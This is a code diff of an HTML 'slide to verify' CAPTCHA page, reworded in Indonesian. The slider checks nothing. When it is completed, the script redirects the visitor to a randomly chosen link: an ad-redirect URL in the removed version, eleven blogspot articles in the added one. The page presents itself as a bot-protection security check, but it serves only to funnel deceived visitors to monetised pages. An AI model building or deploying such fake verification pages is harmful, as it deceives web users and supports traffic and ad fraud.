@@ -1,25 +1,42 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Slide to Verify</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Verifikasi</title>
   <style>
     * {
       box-sizing: border-box;
     }
 
-    body {
+    html, body {
+      margin: 0;
+      padding: 0;
       font-family: sans-serif;
-      text-align: center;
-      padding: 60px 20px;
-      background: #f9f9f9;
+      height: 100%;
+      overflow: hidden;
+    }
+
+    #popupOverlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      background: rgba(255, 255, 255, 0.98);
+      z-index: 9999;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
     }
 
     h2 {
+      font-size: 1.3rem;
       margin-bottom: 40px;
+      text-align: center;
       color: #333;
-      font-size: 1.2rem;
     }
 
     #sliderBox {
@@ -80,10 +97,6 @@
         font-size: 1rem;
       }
 
-      #sliderText {
-        font-size: 0.85rem;
-      }
-
       #sliderBox, #sliderButton {
         height: 44px;
       }
@@ -98,86 +111,98 @@
       }
 
       #sliderText {
+        font-size: 0.85rem;
         line-height: 44px;
       }
     }
   </style>
 </head>
 <body>
-<h1>Security Check</h1>
-<p>Please complete the CAPTCHA below to proceed.</p>
-<p>This step helps protect our platform from malicious bots.</p>
 
+<div id="popupOverlay">
+  <h2>Geser untuk melanjutkan</h2>
   <div id="sliderBox">
     <div id="progressBar"></div>
-    <div id="sliderText">Slide to Verify</div>
+    <div id="sliderText">Geser ke kanan</div>
     <div id="sliderButton"></div>
   </div>
+</div>
 
-  <script>
-    const button = document.getElementById("sliderButton");
-    const progress = document.getElementById("progressBar");
-    const box = document.getElementById("sliderBox");
-    const text = document.getElementById("sliderText");
+<script>
+  const button = document.getElementById("sliderButton");
+  const progress = document.getElementById("progressBar");
+  const box = document.getElementById("sliderBox");
+  const text = document.getElementById("sliderText");
+  const popup = document.getElementById("popupOverlay");
 
-    let isDragging = false;
-    let startX;
-    let verified = false;
+  let isDragging = false;
+  let startX;
+  let verified = false;
 
-    function getMaxSlide() {
-      return box.offsetWidth - button.offsetWidth;
+  function getMaxSlide() {
+    return box.offsetWidth - button.offsetWidth;
+  }
+
+  function onDragStart(e) {
+    if (verified) return;
+    isDragging = true;
+    startX = e.clientX || e.touches[0].clientX;
+  }
+
+  function onDragMove(e) {
+    if (!isDragging || verified) return;
+    const currentX = e.clientX || e.touches[0].clientX;
+    let moveX = currentX - startX;
+    const maxSlide = getMaxSlide();
+    moveX = Math.max(0, Math.min(moveX, maxSlide));
+    button.style.left = moveX + "px";
+    progress.style.width = (moveX + button.offsetWidth / 2) + "px";
+  }
+
+  function onDragEnd() {
+    if (!isDragging || verified) return;
+    isDragging = false;
+    const currentLeft = parseInt(button.style.left, 10);
+    const maxSlide = getMaxSlide();
+    if (currentLeft >= maxSlide) {
+      verified = true;
+      button.style.left = maxSlide + "px";
+      progress.style.width = "100%";
+      text.innerText = "Terverifikasi!";
+      redirectNow();
+    } else {
+      button.style.left = "0px";
+      progress.style.width = "0px";
     }
+  }
 
-    function onDragStart(e) {
-      if (verified) return;
-      isDragging = true;
-      startX = e.clientX || e.touches[0].clientX;
-    }
+  button.addEventListener("mousedown", onDragStart);
+  button.addEventListener("touchstart", onDragStart);
 
-    function onDragMove(e) {
-      if (!isDragging || verified) return;
-      const currentX = e.clientX || e.touches[0].clientX;
-      let moveX = currentX - startX;
-      const maxSlide = getMaxSlide();
-      moveX = Math.max(0, Math.min(moveX, maxSlide));
-      button.style.left = moveX + "px";
-      progress.style.width = (moveX + button.offsetWidth / 2) + "px";
-    }
+  document.addEventListener("mousemove", onDragMove);
+  document.addEventListener("touchmove", onDragMove);
 
-    function onDragEnd() {
-      if (!isDragging || verified) return;
-      isDragging = false;
-      const currentLeft = parseInt(button.style.left, 10);
-      const maxSlide = getMaxSlide();
-      if (currentLeft >= maxSlide) {
-        verified = true;
-        button.style.left = maxSlide + "px";
-        progress.style.width = "100%";
-        text.innerText = "Terverifikasi!";
-        redirectNow();
-      } else {
-        button.style.left = "0px";
-        progress.style.width = "0px";
-      }
-    }
+  document.addEventListener("mouseup", onDragEnd);
+  document.addEventListener("touchend", onDragEnd);
 
-    // Events untuk mouse dan touch (mobile)
-    button.addEventListener("mousedown", onDragStart);
-    button.addEventListener("touchstart", onDragStart);
+  function redirectNow() {
+    const links = [
+      "https://dodolbodolan.blogspot.com/2025/07/why-creative-design-matters-more-than.html",
+      "https://dodolbodolan.blogspot.com/2025/07/fuel-switches-under-scrutiny-in-air.html",
+      "https://dodolbodolan.blogspot.com/2025/07/strange-eggs-unraveling-double-yolks.html",
+      "https://dodolbodolan.blogspot.com/2025/07/netflix-breaks-silence-fan-favorite.html",
+      "https://dodolbodolan.blogspot.com/2025/07/nyt-mini-crossword-friday-july-18.html",
+      "https://dodolbodolan.blogspot.com/2025/07/andy-byron-kristin-cabot-meme-sensation.html",
+      "https://dodolbodolan.blogspot.com/2025/07/wheelchair-enabled-combat-in-cyberpunk.html",
+      "https://dodolbodolan.blogspot.com/2025/07/a-tiny-tale-unveils-whimsical-robot.html",
+      "https://dodolbodolan.blogspot.com/2025/07/black-cat-rebels-against-child-free.html",
+      "https://dodolbodolan.blogspot.com/2025/07/nyt-strands-hints-answers-july-18-2025.html",
+      "https://dodolbodolan.blogspot.com/2025/07/moms-clever-way-to-use-chatgpt-for-her.html"
+    ];
+    const index = Math.floor(Math.random() * links.length);
+    window.location.href = links[index];
+  }
+</script>
 
-    document.addEventListener("mousemove", onDragMove);
-    document.addEventListener("touchmove", onDragMove);
-
-    document.addEventListener("mouseup", onDragEnd);
-    document.addEventListener("touchend", onDragEnd);
-
-    function redirectNow() {
-      const links = [
-        "https://otieu.com/4/9463851"
-      ];
-      const index = Math.floor(Math.random() * links.length);
-      window.location.href = links[index];
-    }
-  </script>
 </body>
 </html>
